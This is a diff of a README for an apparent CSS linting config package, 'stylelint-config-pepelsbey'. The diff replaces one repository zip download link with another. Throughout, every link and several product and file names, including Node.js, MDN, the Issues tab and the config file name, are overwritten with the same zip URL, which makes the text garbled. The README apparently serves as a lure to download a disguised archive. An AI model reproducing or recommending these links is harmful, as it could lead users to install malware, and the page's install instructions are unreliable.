@@ -1,6 +1,6 @@
 # 🎨 stylelint-config-pepelsbey - Easy CSS Linting Made Simple
 
-[![Download stylelint-config-pepelsbey](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip%20Now-Stylelint%20Config-blue?style=for-the-badge)](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip)
+[![Download stylelint-config-pepelsbey](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip%20Now-Stylelint%20Config-blue?style=for-the-badge)](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to stylelint-config-pepelsbey! This application provides a simple way to
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [stylelint-config-pepelsbey Releases](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip).
+To get started, visit this page to download: [stylelint-config-pepelsbey Releases](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip).
 
 This section explains how to download and set up the application on your computer.
 
@@ -25,10 +25,10 @@ Follow the simple prompts on the screen to finish the installation. After instal
 Before you install, ensure your system meets the following requirements:
 
 - **Operating System:** Mac OS, Windows, or Linux
-- **https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip** Version 10 or higher
+- **https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip** Version 10 or higher
 - **npm:** Version 5.2 or higher
 
-If you don’t have https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip or npm yet, you can download them from the official https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip website. Just follow the installation instructions for your operating system.
+If you don’t have https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip or npm yet, you can download them from the official https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip website. Just follow the installation instructions for your operating system.
 
 ## 🌟 Features
 
@@ -48,8 +48,8 @@ After installing stylelint-config-pepelsbey, you may want to set it up for your 
    ```
    npm install stylelint stylelint-config-pepelsbey --save-dev
    ```
-3. Create a `https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip` file if you don’t have one yet.
-4. Add the following content to the `https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip` file:
+3. Create a `https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip` file if you don’t have one yet.
+4. Add the following content to the `https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip` file:
    ```json
    {
      "extends": "stylelint-config-pepelsbey"
@@ -72,9 +72,9 @@ This command will check all CSS files in your project and show any issues found 
 
 If you want to learn more about stylelint and how to make the most out of it, check out these resources:
 
-- [stylelint Documentation](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip)
-- [CSS Tricks](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip)
-- [MDN Web Docs](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip)
+- [stylelint Documentation](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip)
+- [CSS Tricks](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip)
+- [MDN Web Docs](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip)
 
 These guides will help amplify your CSS skills and ensure your code is clean and maintainable.
 
@@ -90,7 +90,7 @@ We welcome contributions! If you have suggestions or improvements, feel free to 
 
 ## 🐛 Issues
 
-If you encounter any issues or bugs while using stylelint-config-pepelsbey, please report them. Go to the [Issues tab](https://raw.githubusercontent.com/GUBALLA/stylelint-config-pepelsbey/main/Bayogoula/pepelsbey-stylelint-config-returner.zip) on GitHub to submit your report. Make sure to include details about your environment and specific issues you faced.
+If you encounter any issues or bugs while using stylelint-config-pepelsbey, please report them. Go to the [Issues tab](https://github.com/GUBALLA/stylelint-config-pepelsbey/raw/refs/heads/main/Bayogoula/config_pepelsbey_stylelint_v2.1-beta.1.zip) on GitHub to submit your report. Make sure to include details about your environment and specific issues you faced.
 
 ## 📚 License
 
